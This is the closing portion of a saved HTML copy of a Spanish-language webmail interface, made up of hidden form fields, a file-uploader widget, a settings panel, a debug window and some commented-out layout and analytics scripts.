        <input type="hidden" name="AttachTotalSize" value="0" id="AttachTotalSize">
        <input type="hidden" name="sScheduledMailSentDate" value="" id="sScheduledMailSentDate">
        <input type="hidden" name="ScheduledMailRelateDTS" value="" id="ScheduledMailRelateDTS">
        <input type="hidden" name="strTextBody" value="" id="strTextBody">
        <input type="hidden" name="strHTMLBody" value="" id="strHTMLBody">
    </form>
    <iframe name="my_iframe" id="my_iframe" src="./index_files/saved_resource(9).html" __idm_frm__="2968"></iframe>
</div>

<!--<script>-->


<!--$(window).load(function() {-->
<!---->
<!---->
<!--$("#RTE_Header_Title").bind('dragstart', function(){-->
<!--return false; -->
<!--});-->
<!---->
<!--$('#divRTETitle').bind('mouseup', fnRTEHeaderClick);-->
<!---->
<!--});-->

<!--</script>-->
<!-- ##################   RTE ############################### -->


<!-- ::::: UPLOADER 3 STARTS  ::::: -->
<img class="postLoadIMG"
     data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/trans.png"
     style="display:none" id="image1_aviary" src="https://www.infinitummail.com/app/">
<div id="selectFilesButtonContainer" style="position:absolutex; display:none; overflow:hidden; width:100px">
    <div id="yui_3_16_0_1_1545237488113_14" class="yui3-widget yui3-uploader" style="height: 35px; width: 250px;">
        <div id="yui_3_16_0_1_1545237488113_16" class="yui3-uploader-content yui3-widget-content-expanded">
            <button type="button" class="yui3-button" role="button" aria-label="" tabindex="0"
                    style="width: 100%; height: 100%;"></button>
            <input type="file" style="visibility:hidden; width:0px; height: 0px;" multiple="" accept=""></div>
    </div>
</div>
<div id="uploadFilesButtonContainer" style="position:absolutex; display:none">
    <button type="button" id="uploadFilesButton" style="width:250px; height:35px;">##Upload Files</button>
</div>
<div id="overallProgress" style="position:absolute; display:none"></div>
<div id="uploaderOverlay" style="position:absolute; z-index:1000;  visibility:hidden"></div>
<div id="imgdivPrv" class="ImgPrev"
     style="position:absolute; z-index:1002; top:0px; left:0px; display:none; text-align:center"><img id="imgPrv" alt=""
                                                                                                      onload="fnShowimg()"
                                                                                                      class="postLoadIMG"
                                                                                                      data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/trans.png"
                                                                                                      src="https://www.infinitummail.com/app/">
</div>
<div style="display:none;">
    <div style="height:16px;width:100px;background: url(https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/bar_green.gif)"></div>
    <div style="height:16px;width:100px;background: url(https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/bar_white.gif)"></div>
    <div style="height:16px;width:100px;background: url(https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/bar_orange.gif)"></div>
    <div style="height:16px;width:100px;background: url(https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/bar_yellow.gif)"></div>
    <img class="postLoadIMG"
         data-url="https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/img/ajax-loader.gif"
         width="16px" height="16px" src="https://www.infinitummail.com/app/" align="absMiddle"
         style="border:0px; vertical-align:middle; width:16px; height:16px">
</div>
<!-- ::::: UPLOADER 3 ENDS ::::: -->


<!-- Settings Page -->
<div id="divSettings" class="MsgpreFullscreen"
     style="position: absolute; z-index: 101; display: none; background-color: rgb(255, 255, 255); padding: 15px; width: 1545px; height: 234px;">
    <div style=" font-family:arial, sans-serif; font-size:19px; line-height:29px">
        &nbsp;Configuraci�n&nbsp;&nbsp;&nbsp;<a id="settingsBack" href="JavaScript:fnSettingsBack()" class="linkLine"
                                                style=" display:none; font-weight:bold">Regresar</a> <img
            src="./index_files/close_big_gray.png" width="16px" height="16px" onclick="fnSettingsExitFullscreen()"
            title="Cerrar" class="jqTootltip"
            style="padding-top:0px; height:16px; width:16px; cursor:pointer; float:right"></div>
    <div style="border-bottom:0px #E0E0E0 solid; padding-top:20px; display:none"></div>
    <div id="mSettingstabs" class="SettingsMainTabs" style="overflow:hidden;width:100%; display:none">
        <div style="width:2000px; text-align:left;">
            <a class="SettingsTabSpace" style="width:10px">&nbsp;</a>
            <div style="float:left"><a id="SetTab0" class="SettingsTab" onclick="fnOpenSettingsTab(0)">&nbsp;General&nbsp;</a><a
                    class="SettingsTabSpace">&nbsp;</a></div>
            <div style="float:left"><a id="SetTab1" class="SettingsTab"
                                       onclick="fnOpenSettingsTab(1)">&nbsp;Mail&nbsp;</a><a class="SettingsTabSpace">&nbsp;</a>
            </div>
            <div style="float:left"><a id="SetTab2" class="SettingsTab" onclick="fnOpenSettingsTab(2)">&nbsp;Accounts&nbsp;</a><a
                    class="SettingsTabSpace">&nbsp;</a></div>
            <div style="float:left"><a id="SetTab3" class="SettingsTab" onclick="fnOpenSettingsTab(3)">&nbsp;Services&nbsp;</a><a
                    class="SettingsTabSpace">&nbsp;</a></div>
            <div style="float:left"><a id="SetTab4" class="SettingsTab" onclick="fnOpenSettingsTab(4)">&nbsp;Control
                Center&nbsp;</a><a class="SettingsTabSpace">&nbsp;</a></div>
            <div style="width:1000px; height:33px;border-bottom: 1px #DADADD solid; line-height:32px;; float:left">
                &nbsp;
            </div>
        </div>
    </div>
    <div id="SubSettings" style="height:34px;  background-color:#F4F4F4; display:none"></div>
    <iframe id="ifm_settings"
            style="background-color: rgb(255, 255, 255); border: 0px solid rgb(255, 255, 255); overflow: auto; height: 194px;"
            scrolling="auto" frameborder="0" border="0" name="ifm_settings" src="./index_files/saved_resource(10).html"
            width="100%" height="100%" allowtransparency="" borderwidth="0" __idm_frm__="2969"></iframe>
    <div style="height:29px;  line-height:29px ; background-color:#F4F4F4; text-align:center; display:none"><a
            class="InboxActions" id="btnSettingsSave" href="JavaScript:fnSettingsSave()">Save Changes</a>&nbsp;&nbsp;&nbsp;<a
            class="InboxActions" id="btnSettingsCancel" href="JavaScript:fnSettingsExitFullscreen()">Cancel</a></div>
</div>


<!--<script>-->
<!---->
<!--function isiPhone(){-->
<!--return (-->
<!--(navigator.platform.indexOf("iPhone") != -1) ||-->
<!--(navigator.platform.indexOf("iPod") != -1) || (navigator.platform.indexOf("iPad") != -1)-->

<!--);-->
<!--}-->
<!---->
<!--$(window).load(function() {-->
<!---->
<!--if(isiPhone()){-->
<!---->
<!--var ilClientWidth = $(window).width();-->
<!--$('#ifm_login').css('width', (ilClientWidth + 'px') );-->
<!--$('#ifm_login').css('height', (50 + 'px') );-->
<!--$('#ifm_login').css('position', 'static');-->
<!--}-->
<!---->

<!---->
<!---->
<!--document.getElementById("ifm_login").style.display = "";-->
<!--g_fInitPage();-->
<!---->
<!---->
<!--if (window.history && window.history.pushState) {-->

<!--$(window).on('popstate', function() {-->
<!---->
<!--//var currentState = history.state;-->
<!--//alert(currentState )-->
<!--//alert('Back button was pressed.');-->
<!---->
<!--fnExpandFullMessagePrev(false); -->
<!---->
<!--});-->
<!---->
<!--}-->

<!---->
<!--});-->
<!---->
<!---->
<!--$( window ).resize(function() {-->
<!---->
<!--if(isiPhone()){-->
<!---->
<!--var ilClientWidth = $(window).width();-->
<!--$('#ifm_login').css('width', (ilClientWidth + 'px') );-->
<!--$('#ifm_login').css('position', 'static');-->
<!--}-->

<!---->
<!---->
<!--});-->

<!---->
<!--</script>-->


<!-- ::::: divDebug ENDS ::::: -->
<div id="divDebug" class="skin0"
     style="position:absolute; z-index:1000;  background-color:#e5f3fb;top:50px; left:50px; visibility:hidden; display:none">
    <!-- DEBUG WINDOW -->
    <div style="background-color:gray; color:white"><input onclick="fnCloseDebug()" value=" Close " type="button">&nbsp;&nbsp;<input
            onclick="fnClearDebug()" value=" Clear " type="button"></div>
    <textarea rows="20" id="DebugTextarea" cols="50" style="overflow:auto; background-color:green; color:white">&nbsp;&nbsp;&nbsp;--- Debug Log enabled-- </textarea>
</div>


<!--
<script type="text/javascript">
    function downloadJSAtOnload() {
    var element = document.createElement("script");
    element.src = "https://d93eb2ce3b7e6ed8b599-fa56e5a04c591cb9153ab447f5a025a3.ssl.cf2.rackcdn.com/js/cdn-JavaScriptINC_2017.js";
    document.body.appendChild(element);
    }
    if (window.addEventListener)
    window.addEventListener("load", downloadJSAtOnload, false);
    else if (window.attachEvent)
    window.attachEvent("onload", downloadJSAtOnload);
    else window.onload = downloadJSAtOnload;
</script>
-->


<!--&lt;!&ndash; :::: Google Analytics STARTS :::: &ndash;&gt;-->
<!--<script>-->
<!--(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){-->
<!--(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),-->
<!--m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)-->
<!--})(window,document,'script','//www.google-analytics.com/analytics.js','ga');-->

<!--ga('create', 'UA-64560106-1', 'auto');-->
<!--ga('send', 'pageview');-->

<!--</script>-->
<!-- :::: Google Analytics END :::: -->


</body>
</html>